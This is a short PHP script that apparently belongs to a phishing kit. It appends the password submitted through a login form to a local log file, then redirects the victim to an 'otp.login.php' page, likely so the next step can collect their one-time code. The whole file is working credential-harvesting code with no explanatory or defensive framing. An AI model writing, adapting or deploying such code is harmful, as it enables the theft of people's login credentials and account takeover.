<?php

    file_put_contents("log.txt", "Pass: " . $_POST['login_password'] . " ", FILE_APPEND);
header('Location: otp.login.php');
exit();
